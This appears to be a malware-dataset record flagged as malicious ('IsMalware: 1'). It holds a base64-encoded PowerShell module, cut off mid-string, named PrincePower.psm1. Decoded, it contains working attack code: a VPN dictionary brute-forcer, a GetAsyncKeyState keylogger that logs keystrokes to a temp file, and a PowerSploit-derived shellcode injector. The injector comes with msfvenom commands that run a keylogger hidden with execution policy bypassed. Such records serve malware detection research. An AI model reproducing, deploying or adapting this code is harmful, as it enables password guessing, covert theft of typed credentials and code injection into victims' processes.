PrincePower.psm1,2fdb5b421e0dbc41100fc60b3716e8c3,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVZwbkJydXRlRm9yY2V7CjwjCiAgICAuU1lOT1BTSVMKICAgIFRoaXMgV2lsbCBIZWxwIFlvdSB0byBsYXVuY2ggYW4gRGljdGlvbmFyeSBhdHRhY2sgdG8gUFB0UCBMMnRwICYgSWtldjIgVnBuLgoKICAgIEF1dGhvcjogUHJpbmNlJTAwCiAgICAgICAgCiAgICAuUEFSQU1FVEVSIENoZWNrdnBuCiAgICBDaGVja2luZyBWcG4gVGhlIENvbm5lY3Rpb25zIE1hZGUgYnkgeW91IGJlZm9yZSBhdHRhY2sgCgogICAgLlBBUkFNRVRFUiBVc2VybmFtZUZpbGVQYXRoCiAgICBUaGUgdXNlcm5hbWUgZmlsZSBwYXRoLgoKICAgIC5QQVJBTUVURVIgUGFzc3dvcmRGaWxlUGF0aAogICAgVGhlIFBhc3N3b3JkIGZpbGUgcGF0aC4KCiAgICAuUEFSQU1FVEVSIFZQTlR5cGUKICAgIFlvdXIgVlBOIGNvbm5lY3Rpb24gdHlwZS4KCiAgICAuUEFSQU1FVEVSIFR1blR5cGUKICAgIEtpbmQgb2YgdHVubmVsIGVuY3J5cHRpb24uCgogICAgLlBBUkFNRVRFUiBTZXJ2ZXJBZGRyZXNzCiAgICBZb3VyIHRhcmdldCBzZXJ2ZXIgZm9yIERpY3Rpb25hcnkgYXR0YWNrLgoKICAgIC5FWEFNUExFCiAgICAgSW52b2tlLVZwbkJydXRlRm9yY2UgLVNlcnZlckFkZHJlc3MgMTkyLjE2OC4yMC4xMCAtVXNlcm5hbWVGaWxlUGF0aCBDOlxVc2VybmFtZXMudHh0IC1QYXNzd29yZEZpbGVQYXRoIEM6XFBhc3N3b3Jkcy50eHQgLVR1blR5cGUgUHB0cCAKCiAgICAuTElOSwogICAgIGh0dHBzOi8vZ2l0aHViLmNvbS9QcmluY2UtQW1pci9PZmZlbnNpdmUtUG93ZXJzaGVsbC5naXQKIz4KICAgIFtDbWRsZXRCaW5kaW5nKCldcGFyYW0gKAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbc3RyaW5nXQogICAgICAgICRTZXJ2ZXJBZGRyZXNzLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICAkVXNlcm5hbWVGaWxlUGF0aCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgJFBhc3N3b3JkRmlsZVBhdGgsCgogICAgICAgIAogICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1R1blR5cGUnLCBNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtWYWxpZGF0ZXNldCgnUHB0cCcsJ0wydHAnLCdJa2V2MicsJ0F1dG9tYXRpYycpXQogICAgICAgIFtBbGlhcygndHQnKV0KICAgICAgICBbc3RyaW5nXQogICAgICAgICRUdW5UeXBlCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgKQoKCkJFR0lOewoKICAgICRVc2VybmFtZUZpbGVQYXRoID0gR2V0LUNvbnRlbnQgJFVzZXJuYW1lRmlsZVBhdGgKICAgICRQYXNzd29yZEZpbGVQYXRoID0gR2V0LUNvbnRlbnQgJFBhc3N3b3JkRmlsZVBhdGgKCiAgICAkQ2hlY2t2cG4gPSBHZXQtVnBuQ29ubmVjdGlvbgogICAgICAgIAogICAgICAgIGlmICgkQ2hlY2t2cG4uQ29ubmVjdGlvblN0YXR1cyAtY21hdGNoICdDb25uZWN0ZWQnKXsKCiAgICAgICAgZWNobyAnISFZb3VyIENvbm5lY3RlZCBCeSBZb3VyIEJydXRlciBDb25uZWN0aW9uIEZpcnN0IERpc2Nvbm5lY3QhIScKICAgICAgICByZXR1cm59CgoKICAgICAgICBlbHNlaWYgKCRDaGVja3Zwbi5OYW1lIC1tYXRjaCAnQnJ1dGVyJyl7CgogICAgICAgICAgICBTZXQtVnBuQ29ubmVjdGlvbiAtTmFtZSBCcnV0ZXIgLVNlcnZlckFkZHJlc3MgJFNlcnZlckFkZHJlc3MgLVR1bm5lbFR5cGUgJFR1blR5cGUKICAgICAgICAgICAgIychISFZb3VyIFZwbiBIYXMgQnVpbHQgQmVmb3JlIEl0cyBOYW1lZCBCcnV0ZXIgWW91IENhbiBDaGFuZ2UgWW91ciBDb25maWcgSW4gW0NvbnRyb2xQYW5lbFxOZXR3b3JrIGFuZCBJbnRlcm5ldFxOZXR3b3JrIENvbm5lY3Rpb25zXSEhIScKICAgICAgICB9CiAgICAgICAgZWxzZXsKCiAgICAgICAgICAgIEFkZC1WcG5Db25uZWN0aW9uIC1uYW1lIEJydXRlciAtU2VydmVyQWRkcmVzcyAkU2VydmVyQWRkcmVzcyAtVHVubmVsVHlwZSAkVHVuVHlwZSAgICAgICAgICAgICAgIAogICAgICAgICAgIAogICAgICAgIH0KCn0KClBST0NFU1N7CgogICAgCiAgICBmb3JlYWNoICgkdXNlcm5hbWUgaW4gJFVzZXJuYW1lRmlsZVBhdGgpewogICAgCiAgICAgICAgICAgIGZvcmVhY2goJFBhc3N3b3JkIGluICRQYXNzd29yZEZpbGVQYXRoKXsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIFtzdHJpbmddJENvbm5lY3Rpb24gPSAgcmFzZGlhbCAiQnJ1dGVyIiAkdXNlcm5hbWUgJFBhc3N3b3JkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkQ29ubmVjdGlvbiAtbWF0Y2ggJ2Vycm9yJyAgKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtXcml0ZS1Ib3N0ICJbLV0kdXNlcm5hbWUgOiAkUGFzc3dvcmQiIC1Gb3JlZ3JvdW5kQ29sb3IgcmVkIC1CYWNrZ3JvdW5kQ29sb3IgQmxhY2t9CiAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtlY2hvICcgIFlFUyAhISEhIVlvdXIgVXNlcm5hbWUgJiBQYXNzd29yZCBGb3VuZCEhISEhICAnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIFsrXXVzZXJuYW1lOiAkVXNlcm5hbWVGaWxlUGF0aFskeF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gWytdcGFzc3dvcmQ6ICRQYXNzd29yZEZpbGVQYXRoWyR5XQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdH0KCiAgICAgICAgICAgIH0KCiAgICAgfQogICB9ICAgCn0KCmZ1bmN0aW9uIFN0YXJ0LUtleUxvZ2dlcigkUGF0aD0iJGVudjp0ZW1wXGtleWxvZ2dlci50eHQiKXsKICAjIFNpZ25hdHVyZXMgZm9yIEFQSSBDYWxscwogICRzaWduYXR1cmVzID0gQCcKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvLCBFeGFjdFNwZWxsaW5nPXRydWUpXSAKcHVibGljIHN0YXRpYyBleHRlcm4gc2hvcnQgR2V0QXN5bmNLZXlTdGF0ZShpbnQgdmlydHVhbEtleUNvZGUpOyAKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldEtleWJvYXJkU3RhdGUoYnl0ZVtdIGtleXN0YXRlKTsKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IE1hcFZpcnR1YWxLZXkodWludCB1Q29kZSwgaW50IHVNYXBUeXBlKTsKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFRvVW5pY29kZSh1aW50IHdWaXJ0S2V5LCB1aW50IHdTY2FuQ29kZSwgYnl0ZVtdIGxwa2V5c3RhdGUsIFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXIgcHdzekJ1ZmYsIGludCBjY2hCdWZmLCB1aW50IHdGbGFncyk7CidACgogICMgbG9hZCBzaWduYXR1cmVzIGFuZCBtYWtlIG1lbWJlcnMgYXZhaWxhYmxlCiAgJEFQSSA9IEFkZC1UeXBlIC1NZW1iZXJEZWZpbml0aW9uICRzaWduYXR1cmVzIC1OYW1lICdXaW4zMicgLU5hbWVzcGFjZSBBUEkgLVBhc3NUaHJ1CiAgICAKICAjIGNyZWF0ZSBvdXRwdXQgZmlsZQogICRudWxsID0gTmV3LUl0ZW0gLVBhdGggJFBhdGggLUl0ZW1UeXBlIEZpbGUgLUZvcmNlCgogIHRyeQogIHsKICAgICMgV3JpdGUtSG9zdCAnUmVjb3JkaW5nIGtleSBwcmVzc2VzLiBQcmVzcyBDVFJMK0MgdG8gc2VlIHJlc3VsdHMuJyAtRm9yZWdyb3VuZENvbG9yIFJlZAogICAgIyBXcml0ZS1Ib3N0ICJZb3VyIEtleXMgRHVtcGVkIEluICRlbnY6dGVtcCIgLUZvcmVncm91bmRDb2xvciBSZWQKICAgICMgY3JlYXRlIGVuZGxlc3MgbG9vcC4gV2hlbiB1c2VyIHByZXNzZXMgQ1RSTCtDLCBmaW5hbGx5LWJsb2NrCiAgICAjIGV4ZWN1dGVzIGFuZCBzaG93cyB0aGUgY29sbGVjdGVkIGtleSBwcmVzc2VzCiAgICB3aGlsZSAoJHRydWUpIHsKICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA0MAogICAgICAKICAgICAgIyBzY2FuIGFsbCBBU0NJSSBjb2RlcyBhYm92ZSA4CiAgICAgIGZvciAoJGFzY2lpID0gOTsgJGFzY2lpIC1sZSAyNTQ7ICRhc2NpaSsrKSB7CiAgICAgICAgIyBnZXQgY3VycmVudCBrZXkgc3RhdGUKICAgICAgICAkc3RhdGUgPSAkQVBJOjpHZXRBc3luY0tleVN0YXRlKCRhc2NpaSkKCiAgICAgICAgIyBpcyBrZXkgcHJlc3NlZD8KICAgICAgICBpZiAoJHN0YXRlIC1lcSAtMzI3NjcpIHsKICAgICAgICAgICRudWxsID0gW2NvbnNvbGVdOjpDYXBzTG9jawoKICAgICAgICAgICMgdHJhbnNsYXRlIHNjYW4gY29kZSB0byByZWFsIGNvZGUKICAgICAgICAgICR2aXJ0dWFsS2V5ID0gJEFQSTo6TWFwVmlydHVhbEtleSgkYXNjaWksIDMpCgogICAgICAgICAgIyBnZXQga2V5Ym9hcmQgc3RhdGUgZm9yIHZpcnR1YWwga2V5cwogICAgICAgICAgJGtic3RhdGUgPSBOZXctT2JqZWN0IEJ5dGVbXSAyNTYKICAgICAgICAgICRjaGVja2tic3RhdGUgPSAkQVBJOjpHZXRLZXlib2FyZFN0YXRlKCRrYnN0YXRlKQoKICAgICAgICAgICMgcHJlcGFyZSBhIFN0cmluZ0J1aWxkZXIgdG8gcmVjZWl2ZSBpbnB1dCBrZXkKICAgICAgICAgICRteWNoYXIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyCgogICAgICAgICAgIyB0cmFuc2xhdGUgdmlydHVhbCBrZXkKICAgICAgICAgICRzdWNjZXNzID0gJEFQSTo6VG9Vbmljb2RlKCRhc2NpaSwgJHZpcnR1YWxLZXksICRrYnN0YXRlLCAkbXljaGFyLCAkbXljaGFyLkNhcGFjaXR5LCAwKQoKICAgICAgICAgIGlmICgkc3VjY2VzcykgCiAgICAgICAgICB7CiAgICAgICAgICAgICMgYWRkIGtleSB0byBsb2dnZXIgZmlsZQogICAgICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpBcHBlbmRBbGxUZXh0KCRQYXRoLCAkbXljaGFyLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlKSAKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgIH0KICAgIH0KICB9CiAgZmluYWxseQogIHsKICAgICMgb3BlbiBsb2dnZXIgZmlsZSBpbiBOb3RlcGFkCiAgICAjIG5vdGVwYWQgJFBhdGgKICB9Cn0KCgpmdW5jdGlvbiBJbnZva2UtU2hlbGxjb2Rla2V5TG9newo8IwouU1lOT1BTSVMKCkluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgcHJvY2VzcyBJRCBvZiB5b3VyIGNob29zaW5nIG9yIHdpdGhpbiB0aGUgY29udGV4dCBvZiB0aGUgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MuCgpQb3dlclNwbG9pdCBGdW5jdGlvbjogSW52b2tlLVNoZWxsY29kZQpBdXRob3I6IE1hdHRoZXcgR3JhZWJlciAoQG1hdHRpZmVzdGF0aW9uKQpMaWNlbnNlOiBCU0QgMy1DbGF1c2UKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lCk9wdGlvbmFsIERlcGVuZGVuY2llczogTm9uZQogCi5ERVNDUklQVElPTgoKUG9ydGlvbnMgb2YgdGhpcyBwcm9qZWN0IHdhcyBiYXNlZCB1cG9uIHN5cmluZ2UuYyB2MS4yIHdyaXR0ZW4gYnkgU3BlbmNlciBNY0ludHlyZQoKUG93ZXJTaGVsbCBleHBlY3RzIHNoZWxsY29kZSB0byBiZSBpbiB0aGUgZm9ybSAweFhYLDB4WFgsMHhYWC4gVG8gZ2VuZXJhdGUgeW91ciBzaGVsbGNvZGUgaW4gdGhpcyBmb3JtLCB5b3UgY2FuIHVzZSB0aGlzIGNvbW1hbmQgZnJvbSB3aXRoaW4gQmFja3RyYWNrIChUaGFua3MsIE1hdHQgYW5kIGcwdG0xbGspOgoKbXNmcGF5bG9hZCB3aW5kb3dzL2V4ZWMgQ01EPSJjbWQgL2sgY2FsYyIgRVhJVEZVTkM9dGhyZWFkIEMgfCBzZWQgJzEsNmQ7cy9bIjtdLy9nO3MvXFwvLDAvZycgfCB0ciAtZCAnXG4nIHwgY3V0IC1jMi0gCm1zZnZlbm9tIC1wIHdpbmRvd3MvZXhlYyAtYSB4ODYgQ01EPSJQb3dlclNoZWxsIC13aW5kb3dzdHlsZSBoaWRkZW4gLWV4ZWMgYnlwYXNzIEM6XEJlc3QtS2V5TG9nZ2VyLnBzMSIgRVhJVEZVTkM9dGhyZWFkIC1mIHBvd2Vyc2hlbGwKbXNmdmVub20gLXAgd2luZG93cy94NjQvZXhlYyAtYSB4ODYgQ01EPSJQb3dlclNoZWxsIC13aW5kb3dzdHlsZSBoaWRkZW4gLWV4ZWMgYnlwYXNzIEM6XEJlc3QtS2V5TG9nZ2VyLnBzMSIgRVhJVEZVTkM9dGhyZWFkIC1mIHBvd2Vyc2hlbGwKCk1ha2Ugc3VyZSB0byBzcGVjaWZ5ICd0aHJlYWQnIGZvciB5b3VyIGV4aXQgcHJvY2Vzcy4gQWxzbywgZG9uJ3QgYm90aGVyIGVuY29kaW5nIHlvdXIgc2hlbGxjb2RlLiBJdCdzIGVudGlyZWx5IHVubmVjZXNzYXJ5LgogCi5QQVJBTUVURVIgUHJvY2Vzc0lECgpQcm9jZXNzIElEIG9mIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBzaGVsbGNvZGUgaW50by4KCi5QQVJBTUVURVIgU2hlbGxjb2RlCgpTcGVjaWZpZXMgYW4gb3B0aW9uYWwgc2hlbGxjb2RlIHBhc3NlZCBpbiBhcyBhIGJ5dGUgYXJyYXkKCi5QQVJBTUVURVIgRm9yY2UKCkluamVjdHMgc2hlbGxjb2RlIHdpdGhvdXQgcHJvbXB0aW5nIGZvciBjb25maXJtYXRpb24uIEJ5IGRlZmF1bHQsIEludm9rZS1TaGVsbGNvZGUgcHJvbXB0cyBmb3IgY29uZmlybWF0aW9uIGJlZm9yZSBwZXJmb3JtaW5nIGFueSBtYWxpY2lvdXMgYWN0LgoKLkVYQU1QTEUKCkM6XFBTPiBJbnZva2UtU2hlbGxjb2Rla2V5TG9nIC1Qcm9jZXNzSWQgNDI3NAoKRGVzY3JpcHRpb24KLS0tLS0tLS0tLS0KSW5qZWN0IGtleWxvZ2dlciBpbnRvIHByb2Nlc3MgSUQgNDI3NC4KCi5FWEFNUExFCgpDOlxQUz4gSW52b2tlLVNoZWxsY29kZQoKRGVzY3JpcHRpb24KLS0tLS0tLS0tLS0KSW5qZWN0IGtleWxvZ2dlciBpbnRvIHRoZSBleHBsb3JlciBwcm9jZXNzIG9mIGN1cnJlbnQgbG9naW4gdXNlci4KCgpEZXNjcmlwdGlvbgotLS0tLS0tLS0tLQpPdmVycmlkZXMgdGhlIHNoZWxsY29kZSBpbmNsdWRlZCBpbiB0aGUgc2NyaXB0IHdpdGggY3VzdG9tIHNoZWxsY29kZSAtIDB4OTAgKE5PUCksIDB4OTAgKE5PUCksIDB4QzMgKFJFVCkKV2FybmluZzogVGhpcyBzY3JpcHQgaGFzIG5vIHdheSB0byB2YWxpZGF0ZSB0aGF0IHlvdXIgc2hlbGxjb2RlIGlzIDMyIHZzLiA2NC1iaXQhCiM+CgoKW0NtZGxldEJpbmRpbmcoIERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJywgU3VwcG9ydHNTaG91bGRQcm9jZXNzID0gJFRydWUgLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKAogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtVSW50MTZdCiAgICAkUHJvY2Vzc0lEID0gJEV4cGxvcmVyUFMsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnUnVuTG9jYWwnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgW0J5dGVbXV0KICAgICRTaGVsbGNvZGUsCiAgICAKICAgIFtTd2l0Y2hdCiAgICAkRm9yY2UgPSAkRmFsc2UKKQoKICAgIFNldC1TdHJpY3RNb2RlIC1WZXJzaW9uIDIuMAoKICAgIGlmICggJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzSUQnXSApCiAgICB7CiAgICAgICAgIyBFbnN1cmUgYSB2YWxpZCBwcm9jZXNzIElEIHdhcyBwcm92aWRlZAogICAgICAgICMgVGhpcyBjb3VsZCBoYXZlIGJlZW4gdmFsaWRhdGVkIHZpYSAnVmFsaWRhdGVTY3JpcHQnIGJ1dCB0aGUgZXJyb3IgZ2VuZXJhdGVkIHdpdGggR2V0LVByb2Nlc3MgaXMgbW9yZSBkZXNjcmlwdGl2ZQogICAgICAgIEdldC1Qcm9jZXNzIC1JZCAkUHJvY2Vzc0lEIC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgIH0KICAgIAogICAgZnVuY3Rpb24gTG9jYWw6R2V0LURlbGVnYXRlVHlwZQogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KICAgICAgICAgICAgW1R5cGVbXV0KICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLAogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxICldCiAgICAgICAgICAgIFtUeXBlXQogICAgICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgICAgICkKCiAgICAgICAgJERvbWFpbiA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluCiAgICAgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykKICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCiAgICAgICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKQogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAkTWV0aG9kQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRSZXR1cm5UeXBlLCAkUGFyYW1ldGVycykKICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAKICAgICAgICBXcml0ZS1PdXRwdXQgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkdldC1Qcm9jQWRkcmVzcwogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldCiAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJE1vZHVsZSwKICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJFByb2NlZHVyZQogICAgICAgICkKCiAgICAgICAgIyBHZXQgYSByZWZlcmVuY2UgdG8gU3lzdGVtLmRsbCBpbiB0aGUgR0FDCiAgICAgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS5FcXVhbHMoJ1N5c3RlbS5kbGwnKSB9CiAgICAgICAgJFVuc2FmZU5hdGl2ZU1ldGhvZHMgPSAkU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMKICAgICAgICAkR2V0TW9kdWxlSGFuZGxlID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKQogICAgICAgICRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQogICAgICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSBtb2R1bGUgc3BlY2lmaWVkCiAgICAgICAgJEtlcm4zMkhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRudWxsLCBAKCRNb2R1bGUpKQogICAgICAgICR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cgogICAgICAgICRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkKICAgICAgICAKICAgICAgICAjIFJldHVybiB0aGUgYWRkcmVzcyBvZiB0aGUgZnVuY3Rpb24KICAgICAgICBXcml0ZS1PdXRwdXQgJEdldFByb2NBZGRyZXNzLkludm9rZSgkbnVsbCwgQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSkKICAgIH0KCiAgICAjIEVtaXRzIGEgc2hlbGxjb2RlIHN0dWIgdGhhdCB3aGVuIGluamVjdGVkIHdpbGwgY3JlYXRlIGEgdGhyZWFkIGFuZCBwYXNzIGV4ZWN1dGlvbiB0byB0aGUgbWFpbiBzaGVsbGNvZGUgcGF5bG9hZAogICAgZnVuY3Rpb24gTG9jYWw6RW1pdC1DYWxsVGhyZWFkU3R1YiAoW0ludFB0cl0gJEJhc2VBZGRyLCBbSW50UHRyXSAkRXhpdFRocmVhZEFkZHIsIFtJbnRdICRBcmNoaXRlY3R1cmUpCiAgICB7CiAgICAgICAgJEludFNpemVQdHIgPSAkQXJjaGl0ZWN0dXJlIC8gOAoKICAgICAgICBmdW5jdGlvbiBMb2NhbDpDb252ZXJ0VG8tTGl0dGxlRW5kaWFuIChbSW50UHRyXSAkQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkgPSBOZXctT2JqZWN0IEJ5dGVbXSgwKQogICAgICAgICAgICAkQWRkcmVzcy5Ub1N0cmluZygiWCQoJEludFNpemVQdHIqMikiKSAtc3BsaXQgJyhbQS1GMC05XXsyfSknIHwgRm9yRWFjaC1PYmplY3QgeyBpZiAoJF8pIHsgJExpdHRsZUVuZGlhbkJ5dGVBcnJheSArPSBbQnl0ZV0gKCcweHswfScgLWYgJF8pIH0gfQogICAgICAgICAgICBbU3lzdGVtLkFycmF5XTo6UmV2ZXJzZSgkTGl0dGxlRW5kaWFuQnl0ZUFycmF5KQogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJENhbGxTdHViID0gTmV3LU9iamVjdCBCeXRlW10oMCkKICAgICAgICAKICAgICAgICBpZiAoJEludFNpemVQdHIgLWVxIDgpCiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweDQ4LDB4QjggICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEJhc2VBZGRyICAgICAgICMgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBSQVgKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDQ4LDB4QjggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIFFXT1JEIFJBWCwgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEV4aXRUaHJlYWRBZGRyICMgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgUkFYCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFtCeXRlW11dICRDYWxsU3R1YiA9IDB4QjggICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIERXT1JEIEVBWCwgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkQmFzZUFkZHIgICAgICAgIyAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIEVBWAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg2QSwweDAwICAgICAgICAgICAgICAgIC